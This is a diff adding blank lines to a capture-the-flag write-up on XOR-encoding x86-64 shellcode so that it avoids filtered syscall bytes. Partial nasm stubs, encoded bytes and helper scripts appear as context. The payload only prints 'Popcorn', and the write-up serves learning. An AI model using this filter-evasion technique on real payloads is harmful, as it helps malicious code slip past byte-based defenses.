@@ -4,6 +4,7 @@
 ]=-----------------=[  UnitedCTF Shellcode Obfuscation 2  ]=------------------=[
 ]=----------------------------------------------------------------------------=[
 
+
 This writeup is for the UnitedCTF competition held in late 2024 online, for the 
 level 2 of the Shellcode Obfuscation series.
 
@@ -29,6 +30,7 @@ encode a part of the shellcode to obfuscate the `0x0f05` bytes.
 
 I already had a basic shellcode from the level 1 to start with:
 
+
 +---------------------------------~<] nasm [>~---------------------------------+
 section .text
     global _start
@@ -49,8 +51,10 @@ _start:
     syscall
 +------------------------------------------------------------------------------+
 
+
 It writes a string to the stack and then calls the `write syscall`. For this 
 challenge, the first part could be modified to the following to print `Popcorn`:
+
 
 +---------------------------------~<] nasm [>~---------------------------------+
 section .text
@@ -70,6 +74,7 @@ _start:
     syscall
 +------------------------------------------------------------------------------+
 
+
 Then i searched the web for different basic shellcode obfuscation techniques and
 stumbled on XORing shellcode directly.
 
@@ -86,6 +91,7 @@ I opted to write the shellcode to the stack since while debugging an other
 solution that xored the shellcode bytes in place, the area was non-writeable and
 I tought it would also be on the challenge so I just stuck with writing it to 
 the stack which was shown as executable in the challenge instructions.
+
 
 +---------------------------------~<] nasm [>~---------------------------------+
 section .text
@@ -123,10 +129,12 @@ call_encoded_shellcode:
     shellcode_len equ $ - encoded_shellcode
 +------------------------------------------------------------------------------+
 
+
 Now, the asm code that prints Popcorn can be XORed with `0xaa` and added to the 
 code above. 
 
 I used this toolchain to build assembly code and convert it to shellcode:
+
 
 > build-shellcode.sh
 +---------------------------------~<] bash [>~---------------------------------+
@@ -159,6 +167,7 @@ if [ "$run_flag" == true ]; then
 fi
 +------------------------------------------------------------------------------+
 
+
 > parse-shellcode.py
 +--------------------------------~<] Python [>~--------------------------------+
 #!/usr/bin/python3
@@ -182,6 +191,7 @@ for c in shellcode:
         print(r"{:02x} byte found".format(c))
 +------------------------------------------------------------------------------+
 
+
 Then, compiling and printing the shellcode for the Popcorn asm gives us a 
 warning that it found `05` and `0f` bytes.
 
@@ -200,6 +210,7 @@ output still doesn't contain any prohibited bytes with a quick `ctrl+f`.
 
 The output can then added to the previous asm code
 
+
 +---------------------------------~<] nasm [>~---------------------------------+
 call_encoded_shellcode:
     call shellcode 
@@ -208,6 +219,7 @@ call_encoded_shellcode:
         db 0xc4,0x8a,0xfa,0xe2,0x9b,0x55,0xe2,0x9b,0x6a,0x1a,0xab
         db 0xea,0x1d,0xab,0xe2,0x23,0x4c,0x18,0xad,0xa5,0xaf
 +------------------------------------------------------------------------------+
+
 
 The asm can finally be compiled to produce the final shellcode.
 
@@ -218,3 +230,4 @@ We see no warnings so the prohibited bytes are not present.
 This was the final shellcode, which when sent as the answer reveals the flag.
 
 [~ The flag prints - /public/pictures/2024-09-21/win_2.png ~]
+
